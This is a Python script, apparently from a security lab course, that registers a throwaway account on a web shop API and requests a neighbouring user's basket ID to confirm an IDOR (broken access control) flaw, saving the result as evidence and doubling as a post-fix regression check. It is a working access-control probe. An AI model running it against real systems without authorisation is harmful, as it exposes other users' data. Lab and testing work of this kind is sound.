#!/usr/bin/env python3
"""Step 1 (find/confirm): does an object endpoint enforce access control?

Creates its own account, then compares access to its OWN object vs a neighbouring
object ID it does not own. A neighbour that returns data instead of 401/403 confirms
a broken-access-control / IDOR candidate. Full enumeration is step 2 (Weeks 5-8).
"""
import sys
import pathlib
import time

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[2] / "common"))
import common  # noqa: E402

CHAIN = "idor"


def register_and_login(s, url):
    email = f"idor_probe_{int(time.time())}@test.local"
    pw = "Passw0rd!probe"
    s.post(url + "/api/Users", json={"email": email, "password": pw,
                                     "passwordRepeat": pw, "securityAnswer": "x"}, timeout=8)
    r = s.post(url + "/rest/user/login", json={"email": email, "password": pw}, timeout=8)
    token = None
    try:
        token = r.json().get("authentication", {}).get("token")
    except Exception:
        pass
    if token:
        s.headers["Authorization"] = f"Bearer {token}"
    return email, token


def try_object(s, url, obj_id):
    # Basket is a per-user object referenced by id -> classic IDOR surface.
    r = s.get(f"{url}/rest/basket/{obj_id}", timeout=8)
    return r.status_code


def main():
    s = common.session()
    if not common.check_target(s):
        sys.exit(1)
    url = common.target_url()

    email, token = register_and_login(s, url)
    if not token:
        print("[!] Could not obtain a token (API shape may differ on this build).")
        print("    Inspect /rest/user/login response and adjust before step 2.")
    own_status = try_object(s, url, 1)
    neighbour_status = try_object(s, url, 2)

    print(f"\n[account]   {email}")
    print(f"[own obj]   basket/1  -> HTTP {own_status}")
    print(f"[neighbour] basket/2  -> HTTP {neighbour_status}  (want 401/403 if control works)")

    idor = neighbour_status not in (401, 403)
    if idor:
        print("\n==> BROKEN ACCESS CONTROL CANDIDATE: neighbour object did not deny access.")
        print("    Next (step 2): enumerate other IDs, measure how many users' data is reachable.")
    else:
        print("\n==> Neighbour access denied. If this is the POST-FIX run, regression passes.")

    common.save_evidence(CHAIN, "idor-confirm", {
        "chain": "broken_access_control_idor",
        "owner": "Sohaila",
        "endpoint": "/rest/basket/{id}",
        "own_object_status": own_status,
        "neighbour_object_status": neighbour_status,
        "verdict": "idor_candidate" if idor else "access_denied",
        "step": "1_find_confirm",
    })


if __name__ == "__main__":
    main()
